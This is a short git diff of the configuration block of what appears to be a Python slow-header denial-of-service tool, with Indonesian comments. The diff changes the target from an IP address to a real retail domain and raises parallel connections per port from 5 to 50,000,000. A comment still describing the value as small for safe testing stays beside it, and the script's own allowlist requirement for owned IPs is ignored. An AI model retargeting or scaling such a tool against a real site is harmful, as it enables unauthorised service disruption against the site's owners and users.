@@ -31,14 +31,14 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ========= KONFIGURASI =========
-TARGET = "http://139.99.61.184"  # bisa http://IP atau http(s)://domain
+TARGET = "https://agift.alfagift.id"  # bisa http://IP atau http(s)://domain
 PATH = "/"  # path yang diminta di baris pertama
 PORTS = [80, 443]  # port yang dicek
-CONNS_PER_PORT = 5  # koneksi paralel per port (nilai kecil untuk testing aman)
+CONNS_PER_PORT = 50000000 # koneksi paralel per port (nilai kecil untuk testing aman)
 DURATION_SEC = 30  # durasi observasi maksimal (dikurangi dari 300 ke 30 detik)
 INTERVAL_SEC = 5  # jeda antar header "dummy" (dikurangi dari 50 ke 5 detik)
 CONNECT_TIMEOUT = 10  # detik (diperbaiki dari 1000000)
-SOCKET_TIMEOUT = 10  # detik (read/send timeout)
+SOCKET_TIMEOUT = 10 # detik (read/send timeout)
 
 # ALLOWLIST IP publik - WAJIB diisi dengan IP yang Anda miliki/izinkan
 ALLOWLIST = {
